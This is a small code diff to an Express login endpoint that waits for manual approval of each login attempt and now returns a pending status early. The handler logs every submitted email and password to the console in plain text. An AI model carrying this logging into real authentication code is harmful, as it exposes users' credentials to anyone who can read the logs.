@@ -22,8 +22,11 @@ app.post("/", async (req, res) => {
     const { email, password, device, region } = req.body;
     console.log("Login attempt:", { email, password, device, region });
 
-    const identifier = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
-    await sendApprovalRequest(email, identifier);
+const identifier = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;
+await sendApprovalRequest(email, identifier);
+
+res.json({ status: "pending", identifier });
+
 
     // Poll until approved/rejected
     const checkStatus = () => new Promise((resolve) => {
@@ -51,3 +54,4 @@ app.get("/", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
